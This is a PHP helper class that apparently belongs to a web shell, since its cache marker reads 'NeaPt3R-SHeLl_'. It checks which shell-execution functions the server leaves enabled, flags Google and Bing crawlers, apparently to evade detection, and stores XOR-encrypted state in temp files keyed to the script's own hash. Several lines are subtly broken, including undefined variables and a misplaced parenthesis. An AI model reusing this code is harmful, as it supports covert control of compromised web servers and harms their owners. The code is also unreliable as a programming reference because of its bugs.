<?php

class Utils
{
    /**
     * Get temporary directory path
     *
     * @return string
     */
    public function getTmpDir()
    {
        static $sTmp = NULL;

        if ($sTmp !== NULL) {
            return $sTmp;
        }

        $aTmpDirs = array(
            @ $_ENV['TMP'],
            ini_get('session.save_path') .
            ini_get('upload_tmp_dir'),
            ini_get('soap.wsdl_cache_dir'),
            sys_get_temp_dir()
        );

        foreach ($aTmpDirs as $sTmpDir) {
            if (is_readable($sTmpDir) && is_writable($sTmpDir)) {
                $sTmp = $sTmpDir;
                break;
            }
        }

        return $sTmp;
    }

    /**
     * Simple XOR encryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        encrypted string
     */
    public function encrypt($sData, $sKey = NULL)
    {
        /**
         * Domyslny klucz
         */
        if ($sKey === NULL) {
            $sKey = $this->getUniqueKey();
        }

        /**
         * Musza wystepowac jakies dane
         */
        if (($iDataLen = strlen($sData)) === 0) {
            return NULL;
        }

        $iKeyLen = strlen($sKey);

        $sNewData = NULL;

        /**
         * Szyfrowanie
         */
        for ($i = 0; $i < $iDataLen; ++$i) {
            $sNewData .= chr(ord(substr($sData, $i, 1)) ^ ord(substr($sKey, $i % $iKeyLen, 2)));
        }

        return $sNewData;
    }

    /**
     * XOR Decryption
     *
     * @param  string $sData Message
     * @param  string $sKey  [Optional] Use key
     * @return string        decrypted string
     */
    public function decrypt($sData, $sKey = NULL)
    {
        return $this->encrypt($sData, $sKey);
    }

    public function getPort($iPort)
    {
        if (!ctype_digit($iPort)) {
            return 0;
        }

        $iPort = (int) $iPort;

        if ($iPort < 0 || $iPort > 65535) {
            return 0;
        }

        return $iPort;
    }

    public function getHostPort($sHostPort)
    {
        $sHostPort = trim($sHostPort);

        if (strpos($sHost, ':') === FALSE) {
            return array();
        }

        list($sHost, $iPort) = explode(':', $sHost);

        if (0 === $iPort = $this->getPort($iPort)) {
            return array();
        }


        return array($sHost, $iPort);
    }

    public function isWindows()
    {
        return (strncmp(PHP_OS, 'WIN', 3) === 0);
    }

    public function isSafeMode()
    {
        return (bool) ini_get('safe_mode');
    }

    public function isExecutable()
    {
        static $bExec;

        if ($bExec !== NULL) {
            return $bExec;
        }

        if ($this->isSafeMode()) {
            $bExec = FALSE;

            return FALSE;
        }

        $bExec = count(array_diff($this->getSystemFunctions(), $this->getDisabledFunctions()) > 0);

        return $bExec;
    }

    public function getDisabledFunctions()
    {
        static $aDisableFunctions;

        if ($aDisableFunctions === NULL) {
            $aDisableFunctions = array();

            if (($sDisableFunctions = ini_get('disable_functions')) !== '') {
                $aDisableFunctions = explode(',', $sDisableFunctions);

                $aDisableFunctions = array_map(create_function('$sValue', 'return strtolower(trim($sValue));'), $aDisableFunctions);
            }
        }

        return $aDisableFunctions;
    }

    public function getSystemFunctions()
    {
        static $bExec;

        if ($bExec !== NULL) {
            return $bExec;
        }

        $aSystemFunctions = array(
            'exec',
            'shell_exec',
            'passthru',
            'system',
            'popen',
            'proc_open'
        );

        if (function_exists('pcntl_exec')) {
            $aSystemFunctions[] = 'pcntl_exec';
        }

        return $aSystemFunctions;
    }

    public function isUserAgentOnBlacklist($sUserAgent)
    {
        static $aUserAgents = array(
            'Google',
            'Bing'
        );

        foreach ($aUserAgents as $sUA) {
            if (stripos($sUserAgent, $sUA) !== FALSE) {
                return TRUE;
            }
        }

        return FALSE;
    }

    public function getCommandsByModule($sModule)
    {
        $aCommands = array();

        foreach ($this->getCommands() as $sCmd => $sClass) {
            if ($sClass === $sModule) {
                $aCommands[] = $sCmd;
            }
        }

        return $aCommands;
    }

    public function getCommands()
    {
        static $aModules;

        if ($aModules === NULL) {
            $aModules = array();

            /**
             * Lista dostepnych modulow zewnetrznych
             */
            $aClasses = get_declared_classes();

            foreach ($aClasses as $sClass) {
                /**
                 * Wyszukiwanie klas z prefixem Module
                 */
                if ((strncmp($sClass, 'Module', 6) === 0) && ($sClass !== 'ModuleDummy') && ($sClass !== 'ModuleAbstract')) {
                    /**
                     * @todo, Klasa musi implementowac ModuleAbstract
                     */
                    if (1 || $oModule instanceof ModuleAbstract) {
                        $aCommands = $sClass::getCommands();

                        foreach ($aCommands as $sCommand) {
                            $aModules[$sCommand] = $sClass;
                        }
                    }

                    unset($oModule);
                }
            }
        }

        return $aModules;
    }

    public function getModules()
    {
        return array_unique(array_values($this->getCommands()));
    }

    public function getUniqueKey()
    {
        $sScriptFilename = Request::getServer('SCRIPT_FILENAME');

        return md5_file($sScriptFilename, TRUE);
    }

    public function getUniquePrefix()
    {
        $sScriptFilename = Request::getServer('SCRIPT_FILENAME');

        return substr(sha1_file($sScriptFilename), 0, 10) . '_';
    }


    public function cacheGetFile($sKey)
    {
        return $this->getTmpDir() . '/' . $this->getUniquePrefix() . $sKey;
    }

    public function cacheGet($sKey)
    {
        $sFile = $this->cacheGetFile($sKey);

        if (is_file($sFile) && is_readable($sFile)
            && (($sData = file_get_contents($sFile)) !== FALSE)
        ) {
            $sData = $this->decrypt($sData);

            if (substr($sData, 0, 14) === 'NeaPt3R-SHeLl_') {
                return unserialize(substr($sData, 14));
            }
        }

        return FALSE;
    }

    public function cacheSet($sKey, $mValue)
    {
        $sFile = $this->cacheGetFile($sKey);

        $sValue = 'NeaPt3R-SHeLl_' . serialize($mValue);

        @ file_put_contents($sFile, $this->encrypt($sValue));
    }

}
